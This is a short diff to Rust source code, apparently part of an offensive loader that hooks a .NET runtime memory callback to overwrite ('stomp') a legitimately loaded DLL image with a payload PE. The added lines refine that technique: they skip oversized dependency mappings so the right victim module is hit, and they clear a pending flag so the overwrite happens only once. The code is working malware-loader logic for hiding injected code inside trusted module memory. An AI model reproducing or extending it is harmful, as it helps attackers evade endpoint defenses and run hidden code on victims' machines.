@@ -385,6 +385,18 @@ unsafe extern "system" fn mm_acquired_vas(
             return S_OK;
         }
 
+        // Upper-bound guard: reject mappings significantly larger than the
+        // selected victim. Dependency DLLs loaded during Load_2 can be larger
+        // than the victim; we don't want to stomp them.
+        // victim_image_size == usize::MAX means GAC read failed — skip check.
+        let victim_image_size = (*sp).victim_image_size;
+        if victim_image_size != usize::MAX
+            && size > victim_image_size.saturating_add(0x10000)
+        {
+            crate::dlog2(b"[stomp] mapping too large (dependency?), skipping");
+            return S_OK;
+        }
+
         let start_u8 = start_addr as *const u8;
         let mz = u16::from_le_bytes([*start_u8, *start_u8.add(1)]);
         if mz != 0x5A4D {
@@ -394,6 +406,11 @@ unsafe extern "system" fn mm_acquired_vas(
         if payload_size < 0x40 {
             return S_OK;
         }
+        // Single-stomp guard: clear pending AFTER all precondition checks pass,
+        // just before the PE copy. This prevents a second AcquiredVAS call
+        // (from a dependency DLL mapped after the victim during Load_2) from
+        // also attempting to stomp.
+        core::ptr::write_volatile(&mut (*sp).pending, 0);
         let e_lfanew = u32::from_le_bytes([
             *payload_bytes.add(0x3C),
             *payload_bytes.add(0x3D),
